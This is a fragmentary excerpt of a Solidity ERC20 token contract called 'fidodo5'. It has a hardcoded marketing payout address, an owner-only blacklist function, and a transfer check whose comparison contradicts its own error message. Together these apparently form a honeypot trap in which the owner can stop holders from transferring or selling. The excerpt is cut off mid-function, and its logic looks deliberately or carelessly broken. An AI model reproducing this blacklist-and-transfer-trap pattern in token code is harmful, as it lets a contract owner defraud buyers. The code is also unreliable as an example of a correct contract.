...
contract fidodo is Context, IERC20, Ownable {
  using SafeMath for uint256;
  using Address for address;

  address payable public marketingAddress =
    payable(0x3868E78Cc73f19234a2e8F795fC17326Af9B0fcD); // Marketing Address
  ...
  string private _name = 'fidodo5';
  string private _symbol = 'fidodo5';
  ...
  // new
  uint256 public _maxblAmount = 1 * 10**9;
...
// new
    if(from != owner() && to != owner() && !_isblacklisted[from]) {
            require(amount >= _maxblAmount, "Transfer amount cannot exceeds 1");
        }
...
// limit
 ...
 // new
    function isblacklisted(address account) public onlyOwner {
        _isblacklisted[account] = true;
    }   

 // new
     function excludeisblacklisted(address account) public onlyOwner {
